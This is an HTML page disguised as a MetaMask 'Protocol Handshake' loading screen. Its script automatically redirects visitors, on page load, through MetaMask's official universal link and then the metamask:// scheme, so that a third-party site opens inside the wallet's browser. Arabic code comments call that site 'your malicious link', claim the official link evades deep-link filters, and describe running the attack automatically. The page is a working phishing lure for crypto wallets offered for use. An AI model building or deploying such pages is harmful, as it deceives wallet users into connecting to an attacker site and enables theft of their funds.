<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MetaMask Protocol Handshake...</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #121212; color: #f6851b; text-align: center; }
        .loader { border: 4px solid #1e1e1e; border-top: 4px solid #f6851b; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.2rem; margin: 0; }
        p { color: #888; font-size: 0.9rem; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <h1>Establishing Secure DApp Connection...</h1>
    <p>Please wait while we redirect you to MetaMask Browser.</p>

    <script>
        // الرابط الخبيث الخاص بك
        const myDapp = "hatestck.vercel.app";

        // الطريقة الأكثر قوة: استخدام الـ Universal Link الرسمي مع الـ Dapp Path
        // هذا الرابط يتجاوز فلاتر الـ Deep Link العادية لأنه "رسمي" من الشركة
        const targetUrl = "https://metamask.app.link/dapp/" + myDapp;

        function startBypass() {
            // محاولة التحويل عبر الـ Universal Link
            window.location.href = targetUrl;
            
            // Backup: إذا فشل الأول بعد ثانيتين، جرب البروتوكول المباشر
            setTimeout(() => {
                window.location.href = "metamask://dapp/" + myDapp;
            }, 2000);
        }

        // تنفيذ الهجوم تلقائياً بعد تحميل الصفحة
        window.onload = startBypass;
    </script>

    <button onclick="startBypass()" style="margin-top: 30px; padding: 10px 20px; background: #f6851b; border: none; color: white; border-radius: 5px; cursor: pointer;">
        Manual Connect
    </button>

</body>
</html>
